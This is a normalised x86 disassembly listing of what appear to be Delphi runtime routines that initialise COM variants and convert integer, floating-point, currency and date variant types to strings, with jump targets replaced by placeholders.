jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411c80
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411ddc
fistp [ esp ]
fwait
jmp r-xdata
sub_4121a8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404844
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40edd4
pop ebx
pop ebp
retn 0x8
sub_4121e0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404844
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40edd4
pop ebx
pop ebp
retn 0x8
sub_412218
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4122ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404844
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40edd4
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4122d5
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404188
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_4043ec
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_4080a4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404990
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_4043ec
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_408068
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_404990
jmp r-xdata
jmp r-xdata
call sub_40e9dc
sub_4122dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41239b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412379
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40edd4
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404954
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404a40
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4043ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412380
lea eax [ ebp - 0x10 ]
call sub_40f178
retn
sub_4123a8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4123fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f4a0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412405
lea eax [ ebp - 0x10 ]
call sub_40f178
retn
sub_41240c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_41468c
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412481
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_4041b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f178
retn
sub_412490
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4129c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4124c9 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4041b8
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404164
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408350
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4041b8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408350
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4041b8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4097c4
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4041b8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4097c4
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4041b8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_4121a8
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4043ec
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_4121e0
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4043ec
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_404954
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404a40
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4043ec
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_412218
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4043ec
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_408350
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_4041b8
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408350
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_4041b8
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_408350
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_4041b8
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_40843c
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_4041b8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_40843c
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_4041b8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412490
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_4122dc
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_4041b8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4129ce
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_404188
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_40485c
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_404188
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_40485c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404188
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4123a8
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4041b8
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4041b8
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e940
test ah 0x40
je r-xdata
mov eax esi
call sub_404164
mov edx eax
mov eax ebx
call sub_41240c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_4122dc
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_4041b8
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_4122dc
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_4041b8
jmp r-xdata
jmp [ eax * 4 + jump_table_41275d ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408350
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_4041b8
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408350
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_4041b8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4097c4
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_4041b8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_4097c4
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4041b8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_4121a8
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4043ec
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_4121e0
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4043ec
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_40438c
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_412218
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4043ec
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408350
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_4041b8
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408350
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_4041b8
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408350
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_4041b8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_40843c
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_4041b8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_40843c
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_4041b8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412490
jmp r-xdata
sub_4129d4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412a7e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412a61
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40edd4
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_404954
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404a40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412a68
lea eax [ ebp - 0x10 ]
call sub_40f178
retn
sub_412a8c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412ae2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f4a0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412bb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412ae9
lea eax [ ebp - 0x10 ]
call sub_40f178
retn
sub_412af0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_412ba8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_41468c
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412baf
lea eax [ ebp - 0x20 ]
call sub_404844
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412b8b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_404954
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404a40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f178
retn
sub_412bb8
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41310a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412bf2 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404990
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404844
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408350
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404990
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408350
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404990
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4097c4
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404990
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4097c4
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404990
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_4121a8
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404880
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_4121e0
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404880
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_404954
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404a40
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_412218
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_404880
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_408350
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404990
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408350
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404990
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_408350
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404990
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_40843c
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404990
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_40843c
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404990
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412bb8
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_4129d4
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404880
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413111
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_40485c
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_404188
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_40485c
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_404188
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_40485c
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_404188
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_40485c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404188
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_412a8c
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404880
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404990
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e940
test ah 0x40
je r-xdata
mov eax esi
call sub_404844
mov edx eax
mov eax ebx
call sub_412af0
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_4129d4
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404880
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_4129d4
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404880
jmp r-xdata
jmp [ eax * 4 + jump_table_412e79 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408350
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404990
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408350
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404990
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_4097c4
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404990
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4097c4
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404990
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_4121a8
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404880
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_4121e0
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404880
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404954
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_412218
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404880
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408350
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404990
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408350
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404990
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408350
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404990
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_40843c
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404990
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_40843c
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404990
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412bb8
jmp r-xdata
sub_413118
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413182
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f4a0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_405b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413189
lea eax [ ebp - 0x10 ]
call sub_40f178
retn
mov dx 0xd
mov ax 0x101
call sub_40e940
sub_413190
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_413118
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405b1c
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_405b1c
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_405b04
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_41468c
test al al
je r-xdata
mov eax esi
call sub_405b04
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_40e940
jmp r-xdata
mov ax [ ebx ]
mov dx 0xd
call sub_40e940
mov eax esi
call sub_405b04
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_40341c
test al al
jne r-xdata
sub_41325c
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_405b04
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_405b04
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_40e940
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405b1c
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_405b1c
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_41468c
test al al
je r-xdata
mov ax [ ebx ]
mov dx 0x9
call sub_40e940
mov eax esi
call sub_405b04
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_40341c
test al al
jne r-xdata
sub_413308
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40f0fc
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_413344
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f0fc
sub_413364
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f0fc
sub_413384
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f0fc
sub_4133a4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f0fc
sub_4133c4
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f0fc
sub_4133e4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f0fc
sub_413404
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f0fc
sub_413430
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_40f0fc
sub_413454
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f0fc
sub_413480
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f0fc
sub_4134ac
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
